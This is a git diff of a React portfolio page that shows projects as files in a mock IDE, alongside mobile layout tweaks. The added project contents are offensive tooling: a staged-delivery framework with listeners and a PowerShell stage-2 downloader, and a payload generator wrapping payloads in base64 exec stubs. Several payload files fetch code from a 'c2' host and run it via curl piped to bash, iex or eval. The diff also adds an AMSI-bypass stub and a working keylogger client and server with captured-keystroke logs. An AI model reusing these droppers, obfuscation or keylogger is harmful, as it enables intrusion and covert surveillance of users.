@@ -5,7 +5,7 @@ import { Reveal } from "@/components/Reveal";
 import {
   Folder, FolderOpen, FileCode2, FileText, FileTerminal, ChevronRight, X,
   Play, Square as Stop, Search, Lock, ExternalLink, Github,
-  Activity, TerminalSquare, Tag, Cpu, Network as NetIcon, Bug,
+  Activity, TerminalSquare, Tag, Cpu, Network as NetIcon, Bug, ChevronDown, Menu,
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 
@@ -159,10 +159,10 @@ if __name__ == "__main__":
   },
   {
     id: "shadow",
-    name: "Shadow Core Framework",
+    name: "Shadow Core",
     domain: "security",
     status: "private",
-    tags: ["framework", "post-exploitation", "private"],
+    tags: ["framework", "post-exploitation", "private", "staged-delivery"],
     description: "Modular core framework for staged payload delivery and controlled listener orchestration.",
     github: "",
     demo: "",
@@ -192,45 +192,470 @@ Modular framework for staged payload delivery and listener orchestration.
 - Pluggable transports
 - Operator audit log
 
+## Tree
+\`\`\`
+.
+├── config.json
+├── deploy.sh
+├── key.txt
+├── listener
+│   └── root_listener.py
+└── public_html
+    ├── index.html
+    ├── payload.bin
+    ├── stage2.ps1
+    └── update.js
+\`\`\`
+
 Status: Private.
 `,
       },
       {
-        name: "ACCESS.txt",
+        name: "config.json",
         lang: "txt",
-        content: `Access level: PUBLIC
-Required:    OPERATOR
-Contact:     mosthistory139@gmail.com`,
+        content: `{
+  "listener_port": 8443,
+  "staging": true,
+  "transport": "https",
+  "beacon_interval": 30
+}`,
+      },
+      {
+        name: "deploy.sh",
+        lang: "bash",
+        content: `#!/bin/bash
+# Shadow Core deploy script
+set -e
+echo "[*] Deploying Shadow Core..."
+chmod +x listener/root_listener.py
+nohup python3 listener/root_listener.py &
+echo "[+] Listener active on port 8443"`,
+      },
+      {
+        name: "key.txt",
+        lang: "txt",
+        content: `-----BEGIN OPENSSH PRIVATE KEY-----
+[REDACTED]
+-----END OPENSSH PRIVATE KEY-----`,
+      },
+      {
+        name: "listener/root_listener.py",
+        lang: "py",
+        content: `#!/usr/bin/env python3
+"""Shadow Core — root listener"""
+import socket, threading, json
+
+HOST, PORT = "0.0.0.0", 8443
+
+def handle_client(conn, addr):
+    print(f"[+] Beacon from {addr}")
+    while True:
+        data = conn.recv(4096)
+        if not data:
+            break
+        print(f"[*] {data.decode(errors='ignore')}")
+    conn.close()
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen(5)
+    print(f"[*] Listening on {HOST}:{PORT}")
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handle_client, args=(conn, addr)).start()
+`,
+      },
+      {
+        name: "public_html/index.html",
+        lang: "txt",
+        content: `<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script src="update.js"></script>
+</body>
+</html>`,
+      },
+      {
+        name: "public_html/stage2.ps1",
+        lang: "txt",
+        content: `# Stage-2 loader
+$wc = New-Object System.Net.WebClient
+$payload = $wc.DownloadData("https://cdn.example.com/payload.bin")
+# [REDACTED execution chain]`,
+      },
+      {
+        name: "public_html/update.js",
+        lang: "js",
+        content: `// Staging bootstrap
+fetch('/payload.bin')
+  .then(r => r.arrayBuffer())
+  .then(buf => {
+    // [REDACTED]
+  });`,
       },
     ],
   },
   {
     id: "payload",
-    name: "Payload Research Toolkit",
+    name: "Payload Generator",
     domain: "security",
     status: "private",
-    tags: ["research", "private", "cross-platform"],
+    tags: ["research", "private", "cross-platform", "obfuscation"],
     description: "Multi-platform payload research toolkit for studying delivery mechanisms and obfuscation.",
     github: "",
     demo: "",
     image: null,
-    runCommand: "$ payloadkit --status",
+    runCommand: "$ python3 payload_generator.py --list",
     runOutput: [
-      "[!] CLASSIFIED — research-only build.",
-      "[*] redacted ████████████████",
-      "[*] redacted ████████████████",
+      "[*] Payload Generator v2.1",
+      "[*] Available formats:",
+      "    [1] windows.payload   — PowerShell dropper",
+      "    [2] linux.payload     — ELF stub",
+      "    [3] macos.payload     — Mach-O bundle",
+      "    [4] python.payload    — PyInstaller",
+      "    [5] javascript.payload— Electron wrapper",
+      "    [6] powershell.payload— AMSI bypass",
+      "[*] Use --format <id> --output <path>",
     ],
     files: [
       {
         name: "README.md",
         lang: "md",
-        content: `# Payload Research Toolkit  ·  CLASSIFIED
+        content: `# Payload Generator  ·  CLASSIFIED
 
 Researches payload formats across OSes — generation, lightweight obfuscation,
 delivery simulation, and listener-side handling for controlled lab environments.
 
+## Tree
+\`\`\`
+.
+├── index.html
+├── payload.js
+├── payload.obf.js
+├── payload_generator.py
+├── payloads
+│   ├── javascript.payload
+│   ├── linux.payload
+│   ├── macos.payload
+│   ├── powershell.payload
+│   ├── python.payload
+│   └── windows.payload
+└── root_listener.py
+\`\`\`
+
 > Source not published. Lab use only.
 `,
+      },
+      {
+        name: "payload_generator.py",
+        lang: "py",
+        content: `#!/usr/bin/env python3
+"""Payload Generator — multi-format research toolkit"""
+import argparse, os, base64
+from pathlib import Path
+
+PAYLOADS = Path("payloads")
+
+FORMATS = {
+    "windows":   ("windows.payload",   "ps1"),
+    "linux":     ("linux.payload",     "sh"),
+    "macos":     ("macos.payload",     "command"),
+    "python":    ("python.payload",    "py"),
+    "javascript":("javascript.payload","js"),
+    "powershell":("powershell.payload","ps1"),
+}
+
+def generate(fmt, output):
+    src, ext = FORMATS[fmt]
+    raw = (PAYLOADS / src).read_bytes()
+    b64 = base64.b64encode(raw).decode()
+    stub = f"# Auto-generated {fmt} payload\n"
+    stub += f"import base64\nexec(base64.b64decode('{b64}'))\n"
+    Path(f"{output}.{ext}").write_text(stub)
+    print(f"[+] Generated {output}.{ext} ({len(stub)} bytes)")
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("--list", action="store_true")
+    p.add_argument("--format", choices=list(FORMATS.keys()))
+    p.add_argument("--output", default="out")
+    args = p.parse_args()
+    if args.list:
+        for k in FORMATS:
+            print(f"  [+] {k}")
+    elif args.format:
+        generate(args.format, args.output)
+
+if __name__ == "__main__":
+    main()
+`,
+      },
+      {
+        name: "payload.js",
+        lang: "js",
+        content: `// Payload delivery stub
+const net = require('net');
+const fs = require('fs');
+
+const client = net.createConnection({ port: 4444, host: '127.0.0.1' }, () => {
+  console.log('[*] Connected to listener');
+});
+
+client.on('data', (data) => {
+  fs.writeFileSync('/tmp/stage2.bin', data);
+  // [REDACTED]
+});
+`,
+      },
+      {
+        name: "payload.obf.js",
+        lang: "js",
+        content: `eval(function(p,a,c,k,e,d){e=function(c){return c};
+if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];
+e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 1=2;0 3=4;',5,5,'var|a|1|b|2'.split('|'),0,{}))
+`,
+      },
+      {
+        name: "root_listener.py",
+        lang: "py",
+        content: `#!/usr/bin/env python3
+"""Root listener for generated payloads"""
+import socket, threading
+
+PORT = 4444
+
+def handler(c, a):
+    print(f"[+] Connection from {a}")
+    c.send(b"\x00\x01\x02\x03")
+    c.close()
+
+with socket.socket() as s:
+    s.bind(("0.0.0.0", PORT))
+    s.listen(5)
+    print(f"[*] Listening on port {PORT}")
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handler, args=(conn, addr)).start()
+`,
+      },
+      {
+        name: "payloads/windows.payload",
+        lang: "txt",
+        content: `# Windows dropper stub
+# Downloads stage-2 from C2 and executes via rundll32
+$wc = New-Object System.Net.WebClient
+$data = $wc.DownloadString("http://c2/stage2")
+iex $data`,
+      },
+      {
+        name: "payloads/linux.payload",
+        lang: "txt",
+        content: `#!/bin/bash
+# Linux ELF stub
+curl -s http://c2/stage2 | bash`,
+      },
+      {
+        name: "payloads/macos.payload",
+        lang: "txt",
+        content: `#!/bin/bash
+# macOS bundle stub
+curl -s http://c2/stage2 | bash`,
+      },
+      {
+        name: "payloads/python.payload",
+        lang: "txt",
+        content: `import urllib.request, subprocess
+url = "http://c2/stage2"
+data = urllib.request.urlopen(url).read()
+# [REDACTED]`,
+      },
+      {
+        name: "payloads/javascript.payload",
+        lang: "txt",
+        content: `fetch("http://c2/stage2")
+  .then(r => r.text())
+  .then(t => eval(t));`,
+      },
+      {
+        name: "payloads/powershell.payload",
+        lang: "txt",
+        content: `$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
+# [REDACTED AMSI bypass chain]`,
+      },
+    ],
+  },
+  {
+    id: "telemetry",
+    name: "Keylogger Framework",
+    domain: "security",
+    status: "archived",
+    tags: ["keylogger", "client-server", "research", "telemetry"],
+    description: "Client-server telemetry framework for capturing and analyzing user input patterns in controlled environments.",
+    github: "",
+    demo: "",
+    image: "/assets/keylogg.png",
+    runCommand: "$ python3 server.py --port 9001",
+    runOutput: [
+      "[*] Keylogger server v1.0",
+      "[*] Listening on 0.0.0.0:9001",
+      "[+] Client connected: 192.168.1.42",
+      "[+] Frame 0001 received  (216 B)",
+      "[+] Frame 0002 received  (188 B)",
+      "[*] Logging to logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
+    ],
+    files: [
+      {
+        name: "README.md",
+        lang: "md",
+        content: `# Keylogger Framework
+
+Client-server tool exploring how endpoint telemetry travels and what patterns
+can be extracted from raw input streams. **Lab-only.**
+
+## Tree
+\`\`\`
+.
+├── keylogger.py
+├── logs
+│   ├── http_1d355b50-64eb-43f2-851a-55bfb62061f1.json
+│   ├── http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json
+│   ├── http_2d99935f-cb1f-48ff-b95a-a62f00166366.json
+│   └── http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json
+└── server.py
+\`\`\`
+`,
+      },
+      {
+        name: "keylogger.py",
+        lang: "py",
+        content: `#!/usr/bin/env python3
+"""Keylogger client — sends keystroke telemetry to server"""
+import keyboard, json, requests, threading, time
+from datetime import datetime
+
+SERVER = "http://127.0.0.1:9001"
+BUFFER = []
+
+def flush():
+    if not BUFFER:
+        return
+    payload = {
+        "timestamp": datetime.now().isoformat(),
+        "keys": BUFFER.copy(),
+        "session": "default"
+    }
+    try:
+        requests.post(SERVER, json=payload, timeout=3)
+    except Exception as e:
+        print(f"[!] Send failed: {e}")
+    BUFFER.clear()
+
+def on_key(event):
+    BUFFER.append({"key": event.name, "time": time.time()})
+    if len(BUFFER) >= 20:
+        flush()
+
+keyboard.on_press(on_key)
+threading.Timer(5.0, flush).start()
+print("[*] Keylogger active — press Ctrl+C to stop")
+keyboard.wait()
+`,
+      },
+      {
+        name: "server.py",
+        lang: "py",
+        content: `#!/usr/bin/env python3
+"""Keylogger server — receives and stores telemetry frames"""
+import socket, json, uuid, os
+from datetime import datetime
+from pathlib import Path
+
+HOST, PORT = "0.0.0.0", 9001
+LOG_DIR = Path("logs")
+LOG_DIR.mkdir(exist_ok=True)
+
+def save_frame(data: bytes):
+    uid = str(uuid.uuid4())
+    path = LOG_DIR / f"http_{uid}.json"
+    try:
+        payload = json.loads(data.decode())
+        payload["server_time"] = datetime.now().isoformat()
+        path.write_text(json.dumps(payload, indent=2))
+        print(f"[+] Saved frame → {path.name}")
+    except Exception as e:
+        print(f"[!] Parse error: {e}")
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen(5)
+    print(f"[*] Listening on {HOST}:{PORT}")
+    while True:
+        conn, addr = s.accept()
+        print(f"[+] Client connected: {addr[0]}")
+        with conn:
+            while True:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                save_frame(data)
+`,
+      },
+      {
+        name: "logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
+        lang: "txt",
+        content: `{
+  "timestamp": "2025-04-23T14:22:01",
+  "keys": [
+    {"key": "h", "time": 1713882121.0},
+    {"key": "e", "time": 1713882121.1},
+    {"key": "l", "time": 1713882121.2},
+    {"key": "l", "time": 1713882121.3},
+    {"key": "o", "time": 1713882121.4}
+  ],
+  "session": "default",
+  "server_time": "2025-04-23T14:22:02"
+}`,
+      },
+      {
+        name: "logs/http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json",
+        lang: "txt",
+        content: `{
+  "timestamp": "2025-04-23T14:25:33",
+  "keys": [
+    {"key": "t", "time": 1713882333.0},
+    {"key": "e", "time": 1713882333.1},
+    {"key": "s", "time": 1713882333.2},
+    {"key": "t", "time": 1713882333.3}
+  ],
+  "session": "default",
+  "server_time": "2025-04-23T14:25:34"
+}`,
+      },
+      {
+        name: "logs/http_2d99935f-cb1f-48ff-b95a-a62f00166366.json",
+        lang: "txt",
+        content: `{
+  "timestamp": "2025-04-23T14:28:12",
+  "keys": [
+    {"key": "ctrl", "time": 1713882492.0},
+    {"key": "c", "time": 1713882492.1}
+  ],
+  "session": "default",
+  "server_time": "2025-04-23T14:28:13"
+}`,
+      },
+      {
+        name: "logs/http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json",
+        lang: "txt",
+        content: `{
+  "timestamp": "2025-04-23T14:30:45",
+  "keys": [
+    {"key": "enter", "time": 1713882645.0}
+  ],
+  "session": "default",
+  "server_time": "2025-04-23T14:30:46"
+}`,
       },
     ],
   },
@@ -443,51 +868,29 @@ cap.release(); cv2.destroyAllWindows()
     ],
   },
   {
-    id: "telemetry",
-    name: "Endpoint Telemetry Logger",
-    domain: "security",
+    id: "tiktok",
+    name: "TikTok Media Downloader",
+    domain: "ai",
     status: "archived",
-    tags: ["telemetry", "client-server", "research"],
-    description: "Client-server telemetry tool for capturing and analyzing user input patterns in controlled environments.",
+    tags: ["http", "scraper", "python"],
+    description: "Lightweight tool for downloading TikTok videos without watermarks or ads.",
     github: "",
-    demo: "",
-    image: "/assets/keylogg.png",
-    runCommand: "$ python3 telemetry_server.py --port 9001",
+    demo: "/assets/tiktok.mp4",
+    image: "/assets/tiktok.png",
+    runCommand: "$ python3 tk_dl.py https://tiktok.com/@x/video/123",
     runOutput: [
-      "[*] Listening on 0.0.0.0:9001",
-      "[+] Client connected: 192.168.1.42",
-      "[+] Frame 0001 received  (216 B)",
-      "[+] Frame 0002 received  (188 B)",
-      "[*] Logging to telemetry_2025-04-23.jsonl",
+      "[*] Resolving URL ...",
+      "[+] Found stream: video_no_wm.mp4 (4.1 MB)",
+      "[+] Downloaded → ./out/123.mp4",
     ],
     files: [
       {
         name: "README.md",
         lang: "md",
-        content: `# Endpoint Telemetry Logger
+        content: `# TikTok Media Downloader
 
-Client-server tool exploring how endpoint telemetry travels and what patterns
-can be extracted from raw input streams. **Lab-only.**
-`,
-      },
-      {
-        name: "telemetry_server.py",
-        lang: "py",
-        content: `import socket, json, datetime
-
-s = socket.socket()
-s.bind(("0.0.0.0", 9001))
-s.listen(1)
-print("[*] Listening on 0.0.0.0:9001")
-
-conn, addr = s.accept()
-print(f"[+] Client connected: {addr[0]}")
-
-with open(f"telemetry_{datetime.date.today()}.jsonl", "a") as f:
-    while True:
-        data = conn.recv(4096)
-        if not data: break
-        f.write(json.dumps({"raw": data.decode(errors="ignore")}) + "\\n")
+Minimal CLI to fetch a TikTok clip without watermark / ad overlay.
+Pure HTTP — no Selenium.
 `,
       },
     ],
@@ -567,34 +970,6 @@ No microcontroller. Just AND/OR/NOT gates wired to drive a motor based on
 ambient light, time signal, and a manual override.
 
 Designed by Karnaugh-map minimization to be hazard-free.
-`,
-      },
-    ],
-  },
-  {
-    id: "tiktok",
-    name: "TikTok Media Downloader",
-    domain: "ai",
-    status: "archived",
-    tags: ["http", "scraper", "python"],
-    description: "Lightweight tool for downloading TikTok videos without watermarks or ads.",
-    github: "",
-    demo: "/assets/tiktok.mp4",
-    image: "/assets/tiktok.png",
-    runCommand: "$ python3 tk_dl.py https://tiktok.com/@x/video/123",
-    runOutput: [
-      "[*] Resolving URL ...",
-      "[+] Found stream: video_no_wm.mp4 (4.1 MB)",
-      "[+] Downloaded → ./out/123.mp4",
-    ],
-    files: [
-      {
-        name: "README.md",
-        lang: "md",
-        content: `# TikTok Media Downloader
-
-Minimal CLI to fetch a TikTok clip without watermark / ad overlay.
-Pure HTTP — no Selenium.
 `,
       },
     ],
@@ -714,6 +1089,7 @@ function ProjectsPage() {
   const [running, setRunning] = useState(false);
   const [showPalette, setShowPalette] = useState(false);
   const [paletteQuery, setPaletteQuery] = useState("");
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const terminalRef = useRef<HTMLDivElement>(null);
 
   const activeProject = PROJECTS.find((p) => p.id === activeId)!;
@@ -728,7 +1104,10 @@ function ProjectsPage() {
         e.preventDefault();
         setShowPalette(true);
       }
-      if (e.key === "Escape") setShowPalette(false);
+      if (e.key === "Escape") {
+        setShowPalette(false);
+        setMobileMenuOpen(false);
+      }
       if ((e.ctrlKey || e.metaKey) && e.key === "Tab") {
         e.preventDefault();
         const list = openTabs[activeId] ?? [];
@@ -745,6 +1124,7 @@ function ProjectsPage() {
 
   const openProject = (id: string) => {
     setActiveId(id);
+    setMobileMenuOpen(false);
     const proj = PROJECTS.find((p) => p.id === id)!;
     setOpenTabs((prev) => ({
       ...prev,
@@ -848,9 +1228,58 @@ function ProjectsPage() {
         </div>
       </Reveal>
 
+      {/* ═════ MOBILE PROJECT SELECTOR ═════ */}
+      <div className="mt-6 lg:hidden">
+        <button
+          onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+          className="flex w-full items-center justify-between rounded-xl border border-glass-border bg-black/40 px-4 py-3"
+        >
+          <div className="flex items-center gap-3">
+            <Menu className="h-4 w-4 text-cyber-cyan" />
+            <span className="font-mono text-sm text-foreground">{activeProject.name}</span>
+            <span className={cn("h-2 w-2 rounded-full", STATUS_COLOR[activeProject.status])} />
+          </div>
+          <ChevronDown className={cn("h-4 w-4 text-muted-foreground transition-transform", mobileMenuOpen && "rotate-180")} />
+        </button>
+
+        <AnimatePresence>
+          {mobileMenuOpen && (
+            <motion.div
+              initial={{ height: 0, opacity: 0 }}
+              animate={{ height: "auto", opacity: 1 }}
+              exit={{ height: 0, opacity: 0 }}
+              transition={{ duration: 0.2 }}
+              className="overflow-hidden"
+            >
+              <div className="mt-2 max-h-80 overflow-y-auto rounded-xl border border-glass-border bg-black/60 p-2">
+                {PROJECTS.map((p) => {
+                  const Icon = DOMAIN_ICON[p.domain];
+                  return (
+                    <button
+                      key={p.id}
+                      onClick={() => openProject(p.id)}
+                      className={cn(
+                        "flex w-full items-center gap-3 rounded-lg px-3 py-2.5 text-left transition-colors",
+                        p.id === activeId
+                          ? "bg-cyber-cyan/10 text-foreground"
+                          : "text-foreground/80 hover:bg-muted/30"
+                      )}
+                    >
+                      <Icon className="h-4 w-4 text-cyber-cyan" />
+                      <span className="flex-1 text-sm font-medium">{p.name}</span>
+                      <span className={cn("h-1.5 w-1.5 rounded-full", STATUS_COLOR[p.status])} />
+                    </button>
+                  );
+                })}
+              </div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </div>
+
       {/* IDE shell */}
       <div
-        className="mt-8 overflow-hidden rounded-2xl ring-1 ring-glass-border"
+        className="mt-4 overflow-hidden rounded-2xl ring-1 ring-glass-border lg:mt-8"
         style={{ background: "oklch(0.10 0.02 265 / 0.92)" }}
       >
         {/* title bar */}
@@ -875,8 +1304,8 @@ function ProjectsPage() {
           </div>
         </div>
 
-        <div className="grid h-[600px] grid-cols-1 lg:grid-cols-[220px_1fr_240px]">
-          {/* file tree */}
+        <div className="grid h-[520px] grid-cols-1 lg:h-[600px] lg:grid-cols-[220px_1fr_240px]">
+          {/* file tree — desktop only */}
           <aside className="hidden overflow-y-auto border-r border-glass-border/60 bg-black/30 p-2 lg:block">
             <div className="px-2 pb-2 font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
               explorer
@@ -979,7 +1408,7 @@ function ProjectsPage() {
                       exit={{ opacity: 0, y: -4 }}
                       transition={{ duration: 0.15 }}
                       className={cn(
-                        "group inline-flex items-center gap-1.5 rounded-t-md border-x border-t px-2.5 py-1 font-mono text-[11px]",
+                        "group inline-flex shrink-0 items-center gap-1.5 rounded-t-md border-x border-t px-2.5 py-1 font-mono text-[11px]",
                         isActiveTab
                           ? "border-glass-border bg-black/60 text-foreground"
                           : "border-transparent text-muted-foreground hover:text-foreground"
@@ -987,7 +1416,7 @@ function ProjectsPage() {
                     >
                       <button onClick={() => setActiveTab((p) => ({ ...p, [activeId]: name }))} className="inline-flex items-center gap-1.5">
                         <FIcon className={cn("h-3 w-3", isActiveTab && "text-cyber-cyan")} />
-                        {name}
+                        <span className="max-w-[100px] truncate sm:max-w-[140px]">{name}</span>
                       </button>
                       {tabs.length > 1 && (
                         <button
@@ -1066,7 +1495,7 @@ function ProjectsPage() {
                   clear
                 </button>
               </div>
-              <div ref={terminalRef} className="h-44 overflow-y-auto px-3 py-2 font-mono text-[11px] leading-relaxed">
+              <div ref={terminalRef} className="h-36 overflow-y-auto px-3 py-2 font-mono text-[11px] leading-relaxed lg:h-44">
                 {terminalLines.map((l, i) => (
                   <div
                     key={i}
@@ -1105,7 +1534,7 @@ function ProjectsPage() {
             </div>
           </main>
 
-          {/* inspector */}
+          {/* inspector — desktop only */}
           <aside className="hidden overflow-y-auto border-l border-glass-border/60 bg-black/30 p-4 lg:block">
             <div className="font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
               inspector
